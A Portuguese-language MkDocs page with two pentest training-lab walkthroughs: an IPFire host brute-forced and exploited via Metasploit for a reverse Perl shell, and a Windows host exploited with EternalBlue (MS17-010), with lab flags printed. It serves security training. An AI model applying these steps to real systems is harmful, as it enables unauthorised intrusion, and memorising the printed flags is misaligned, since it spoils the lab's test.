@@ -1,0 +1,959 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://legitwell.github.io/Vlabs/Semana%2007%20-%20Vulnerabilidades%20e%20Metasploit%20Framework/Semana%2007%20-%20Vulnerabilidades%20e%20Metasploit%20Framework/">
+      
+      
+        <link rel="prev" href="../../Semana%2007%20-%20Enumeration/Semana%2007%20-%20Enumeration/">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.23">
+    
+    
+      
+        <title>LAB 01 - LAB Desec</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.84d31ad4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#lab-01" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="LAB Desec" class="md-header__button md-logo" aria-label="LAB Desec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            LAB Desec
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              LAB 01
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="LAB Desec" class="md-nav__button md-logo" aria-label="LAB Desec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    LAB Desec
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Semana%2004%20-%20Cen%C3%A1rio%20CTF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Semana 04   Cenário CTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Vlabs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Vlabs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Semana 05   INFORMATION GATHERING   Infra
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Semana 05   INFORMATION GATHERING   Infra
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Semana%2005%20-%20INFORMATION%20GATHERING%20-%20Infra/INFRA/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    INFRA
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Semana 05   INFORMATION GATHERING  Business
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Semana 05   INFORMATION GATHERING  Business
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Semana%2005%20-%20INFORMATION%20GATHERING%20-Business/OSINT%20-%20Business/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OSINT   Business
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Semana 06   Mecanismo de Defesa
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Semana 06   Mecanismo de Defesa
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Semana%2006%20-%20Mecanismo%20de%20Defesa/Semana%2006%20-%20Mecanismo%20de%20Defesa/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Semana 06 - Mecanismo de Defesa
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Semana 06   OSINT
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Semana 06   OSINT
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Semana%2006%20-%20OSINT/Semana%2006%20-%20OSINT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    LAB 01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Semana 06   Scanning
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Semana 06   Scanning
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Semana%2006%20-%20Scanning/Semana%2006%20-%20Scanning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    LAB 01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Semana 07   Enumeration
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            Semana 07   Enumeration
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Semana%2007%20-%20Enumeration/Semana%2007%20-%20Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    LAB 01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Semana 07   Vulnerabilidades e Metasploit Framework
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            Semana 07   Vulnerabilidades e Metasploit Framework
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    LAB 01
+    
+  </span>
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="lab-01">LAB 01</h1>
+<p><strong>Host I</strong></p>
+<p>Lab ID: 5077435ad74c4ad35bc8282b65431868ceda0297</p>
+<p>Analise o host 172.16.1.100, identifique e explore a vulnerabilidade.</p>
+<p>Consiga uma shell no host e obtenha a key para pontuar.</p>
+<ol>
+<li>
+<p><strong>Varredura de portas com o Nmap:</strong></p>
+<ul>
+<li>Execute o comando <code>**nmap -sSV -Pn 172.16.1.100**</code> para identificar os serviços em execução e as portas abertas no host.</li>
+</ul>
+<p>![[/Untitled 23.png|Untitled 23.png]]</p>
+</li>
+<li>
+<p><strong>Identificação do serviço HTTP/HTTPS no IPFire:</strong></p>
+<ul>
+<li>Acesse manualmente os serviços HTTP (porta 81) e HTTPS (porta 444) para investigar possíveis vulnerabilidades.</li>
+<li>Descubra que o serviço HTTPS não requer autenticação na URL <code>**https://172.16.1.100:444/cgi-bin/credits.cgi**</code>, mas não permite interação.</li>
+</ul>
+<p>![[/Untitled 1 5.png|Untitled 1 5.png]]</p>
+</li>
+<li>
+<p><strong>Exploração da vulnerabilidade no IPFire com o Metasploit:</strong></p>
+<ul>
+<li>Inicie o Metasploit com o comando <code>**msfconsole**</code>.</li>
+<li>Pesquise por exploits relacionados ao IPFire com <code>**search ipfire**</code> e escolha o exploit <code>**exploit/linux/http/ipfire_oinkcode_exec**</code>.</li>
+</ul>
+<p>![[/Untitled 2 5.png|Untitled 2 5.png]]</p>
+<ul>
+<li>Configure o exploit com <code>**use exploit/linux/http/ipfire_oinkcode_exec**</code>.</li>
+<li>Defina as opções necessárias, como <code>**RHOST**</code> (172.16.1.100) e <code>**SSL**</code> (true).</li>
+<li>Execute o exploit com <code>**exploit**</code> para tentar explorar a vulnerabilidade no IPFire.</li>
+</ul>
+<p>![[/Untitled 3 5.png|Untitled 3 5.png]]</p>
+</li>
+<li>
+<p><strong>Brute force na senha de autenticação HTTP:</strong></p>
+<ul>
+<li>Use o módulo <code>**auxiliary/scanner/http/http_login**</code> para fazer brute force na senha de autenticação HTTP.</li>
+<li>Configure as opções, como <code>**RHOSTS**</code> (172.16.1.100), <code>**RPORT**</code> (444), <code>**SSL**</code> (true), <code>**STOP_ON_SUCCESS**</code> (yes), <code>**PASS_FILE**</code> (wordlist de senhas) e <code>**USER_FILE**</code> (wordlist de usuários).<ul>
+<li>Execute o brute force com <code>**run**</code> e aguarde até encontrar a senha.<br />
+    Login : Admin, Password : security</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Obtenção da shell reversa:</strong></p>
+<ul>
+<li>Configure o exploit <code>**exploit/linux/http/ipfire_oinkcode_exec**</code> para usar uma payload que permita obter uma shell reversa, como <code>**cmd/unix/reverse_perl**</code>.</li>
+<li>Configure as opções <code>**LHOST**</code> (IP da sua máquina) e <code>**LPORT**</code> (porta para conectar) com o seu endereço IP e uma porta disponível.</li>
+<li>Execute o exploit com <code>**exploit**</code> para obter uma shell reversa no host vulnerável.  </li>
+</ul>
+<p>![[/Untitled 4 5.png|Untitled 4 5.png]]</p>
+</li>
+<li>
+<p><strong>Localização da key do laboratório:</strong></p>
+<ul>
+<li>Após obter a shell reversa, navegue pelo sistema de arquivos com comandos como <code>**pwd**</code>, <code>**ls**</code>, <code>**cd**</code>, e <code>**cat**</code> para encontrar o arquivo da key.</li>
+<li>Use o comando <code>**cat /home/nobody/key.txt**</code> para exibir o conteúdo do arquivo e obter a resposta do laboratório.  </li>
+</ul>
+<p>![[/Untitled 5 5.png|Untitled 5 5.png]]</p>
+</li>
+<li>
+<p><strong>Pontuação no laboratório:</strong></p>
+<ul>
+<li>Use a key <code>**key{f1r3wallF@il}**</code> obtida do arquivo para pontuar no laboratório.</li>
+</ul>
+</li>
+</ol>
+<p>![[/Untitled 6 4.png|Untitled 6 4.png]]</p>
+<p>![[/Untitled 7 4.png|Untitled 7 4.png]]</p>
+<h1 id="lab-02">LAB 02</h1>
+<p><strong>Host II</strong></p>
+<p>Lab ID: bff9293a1e74ee87ed773766f6f85feace4ceedb</p>
+<p>Analise o host 172.16.1.233, identifique e explore a vulnerabilidade.</p>
+<p>Consiga uma shell no host e obtenha a informação confidencial para pontuar.</p>
+<ol>
+<li>
+<p><strong>Identificação da vulnerabilidade com o Nessus:</strong></p>
+<ul>
+<li>Use o Nessus para fazer uma varredura no host 172.16.1.233.</li>
+<li>
+<p>Identifique a vulnerabilidade MS17-010 na lista de resultados do Nessus.</p>
+<p>![[/Untitled 8 4.png|Untitled 8 4.png]]</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Busca do script NSE no Nmap:</strong></p>
+<ul>
+<li>No seu sistema, execute o comando <code>**grep 'ms17-010' script.db**</code> para buscar o nome do script NSE relacionado à vulnerabilidade MS17-010.</li>
+<li>O comando deve retornar algo como <code>**Entry { filename = "smb-vuln-ms17-010.nse", categories = { "safe", "vuln", } }**</code>, indicando o nome do arquivo do script NSE.</li>
+</ul>
+<p>![[/Untitled 9 4.png|Untitled 9 4.png]]</p>
+</li>
+<li>
+<p><strong>Execução do script NSE no Nmap:</strong></p>
+<ul>
+<li>Use o Nmap para executar o script <code>**smb-vuln-ms17-010.nse**</code> no host 172.16.1.233 com o comando <code>**nmap --script smb-vuln-ms17-010.nse -Pn 172.16.1.233**</code>.</li>
+<li>Verifique se o Nmap identifica o host como vulnerável à MS17-010, fornecendo detalhes sobre a vulnerabilidade.</li>
+</ul>
+<p>![[/Untitled 10 4.png|Untitled 10 4.png]]</p>
+</li>
+<li>
+<p><strong>Análise dos resultados:</strong></p>
+<ul>
+<li>
+<p>Verifique os resultados do Nmap para confirmar a vulnerabilidade e obter mais informações sobre o risco e as referências relacionadas à vulnerabilidade MS17-010.</p>
+</li>
+<li>
+<p><strong>Exploração com o Metasploit:</strong></p>
+<ul>
+<li>Abra o Metasploit Framework com o comando <code>**msfconsole**</code>.</li>
+<li>Use o comando <code>**search eternalblue**</code> para encontrar o exploit <code>**windows/smb/ms17_010_eternalblue**</code>.</li>
+<li>Configure o exploit com os seguintes comandos:<ul>
+<li><code>**set RHOST 172.16.1.233**</code> para definir o endereço IP do host alvo.</li>
+<li><code>**set LHOST &lt;seu endereço IP&gt;**</code> para definir o endereço IP da sua máquina.</li>
+</ul>
+</li>
+<li>Verifique as opções configuradas com o comando <code>**show options**</code>.</li>
+<li>Execute o exploit com o comando <code>**exploit**</code>.</li>
+</ul>
+</li>
+<li><strong>Exploração bem-sucedida:</strong><ul>
+<li>Se a exploração for bem-sucedida, você obterá uma shell no sistema alvo.</li>
+<li>Use o comando <code>**pwd**</code> para verificar o diretório atual.</li>
+<li>Navegue até o diretório onde a key está localizada usando comandos como <code>**cd C:\\Users\\Administrator\\Desktop**</code>.</li>
+<li>Liste o conteúdo do diretório com <code>**dir**</code> e, em seguida, use <code>**cat confidencial.txt**</code> para exibir o conteúdo do arquivo e encontrar a key do laboratório.</li>
+</ul>
+</li>
+<li>
+<p><strong>Pontuação no laboratório:</strong></p>
+<ul>
+<li>Use a key <code>**key{met45pl0it1337}**</code> para pontuar no vlab.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+    
+  </body>
+</html>
